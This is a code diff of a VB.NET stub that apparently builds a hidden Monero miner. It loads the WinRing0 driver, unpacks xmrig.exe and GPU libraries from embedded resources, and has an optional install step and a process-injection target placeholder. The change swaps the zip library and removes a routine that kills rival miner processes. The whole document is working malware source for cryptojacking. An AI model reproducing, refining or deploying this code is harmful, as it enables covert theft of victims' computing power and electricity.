@@ -11,13 +11,13 @@ Imports System.Collections.Generic
 Imports System.Drawing
 Imports System.Windows.Forms
 Imports System.IO
+Imports System.IO.Compression
 Imports System.Net
 Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
 Imports System.Threading
 Imports System.Security
 Imports System.Text
-Imports Ionic.Zip
 
 #Const Assembly = False
 #Const INS = False
@@ -38,14 +38,11 @@ Imports Ionic.Zip
 <Assembly: Guid("%Guid%")>
 #End If
 
-
-
 Public Class Program
     Public Shared Sub Main()
 #If INS Then
                         Install()
 #End If
-        KillLastProc()
         Initialize()
     End Sub
 
@@ -89,20 +86,6 @@ Public Class Program
         End Try
     End Sub
 
-    Public Shared Sub KillLastProc()
-        On Error Resume Next
-        Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
-        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
-        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget")
-        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
-        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
-        For Each retObject As Object In colProcess
-            If retObject.CommandLine.ToString.Contains("--donate-level=") Then
-                retObject.Terminate()
-            End If
-        Next
-    End Sub
-
     Public Shared Sub Initialize()
         Try
             Dim xmr As Byte() = GetTheResource("#xmr")
@@ -115,13 +98,14 @@ Public Class Program
                 System.IO.Directory.CreateDirectory(baseDir)
                 My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)
 
-                Using zip As ZipFile = ZipFile.Read(New MemoryStream(xmr))
-                    Dim e As ZipEntry
-                    For Each e In zip
-                        If e.FileName.Contains("xmrig.exe") Then
-                            Using ms = New MemoryStream()
-                                e.Extract(ms)
-                                xmrminer = ms.ToArray
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(xmr))
+                    For Each entry As ZipArchiveEntry In archive.Entries
+                        If entry.FullName.Contains("xmrig.exe") Then
+                            Using streamdata As Stream = entry.Open()
+                                Using ms = New MemoryStream()
+                                    streamdata.CopyTo(ms)
+                                    xmrminer = ms.ToArray
+                                End Using
                             End Using
                         End If
                     Next
@@ -132,8 +116,10 @@ Public Class Program
             If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
                 Try
                     Dim libs As Byte() = GetTheResource("#libs")
-                    Using zip As ZipFile = ZipFile.Read(New MemoryStream(libs))
-                        zip.ExtractAll(baseDir, ExtractExistingFileAction.OverwriteSilently)
+                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
+                        For Each entry As ZipArchiveEntry In archive.Entries
+                            entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
+                        Next
                     End Using
 
                     If GPUstr.ToLower.Contains("nvidia") Then
